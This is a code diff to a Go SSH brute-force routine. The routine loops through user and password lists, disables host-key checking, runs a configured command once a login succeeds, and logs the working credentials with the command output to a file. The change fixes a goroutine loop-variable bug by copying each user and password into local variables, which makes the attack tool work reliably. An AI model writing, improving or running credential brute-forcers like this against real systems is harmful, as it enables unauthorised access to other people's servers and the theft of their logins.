@@ -66,10 +66,12 @@ func SSHBrute(host string, port string, file *os.File) {
 		for _, pwd := range sshBrutePwds {
 			if !isSuc {
 				go func() {
+					user_ := user
+					pwd_ := pwd
 					sshConf := &ssh.ClientConfig{
-						User: user,
+						User: user_,
 						Auth: []ssh.AuthMethod{
-							ssh.Password(pwd),
+							ssh.Password(pwd_),
 						},
 						HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 					}
@@ -96,7 +98,7 @@ func SSHBrute(host string, port string, file *os.File) {
 									return
 								}
 
-								sucOutStr := fmt.Sprintf("%v:%v-%v:%v=%v->%v", host, port, user, pwd, Global.CMD, string(shellOutput))
+								sucOutStr := fmt.Sprintf("%v:%v-%v:%v=%v->%v", host, port, user_, pwd_, Global.CMD, string(shellOutput))
 								println(sucOutStr)                        // 输出成功信息
 								_, _ = file.WriteString(sucOutStr + "\n") // 打印信息
 								isSuc = true
@@ -105,7 +107,7 @@ func SSHBrute(host string, port string, file *os.File) {
 
 					} else {
 						if Global.DBG {
-							OutStr := fmt.Sprintf("%v:%v-%v:%v", host, port, user, pwd)
+							OutStr := fmt.Sprintf("%v:%v-%v:%v", host, port, user_, pwd_)
 							println("err" + OutStr)
 							println(err.Error())
 							return
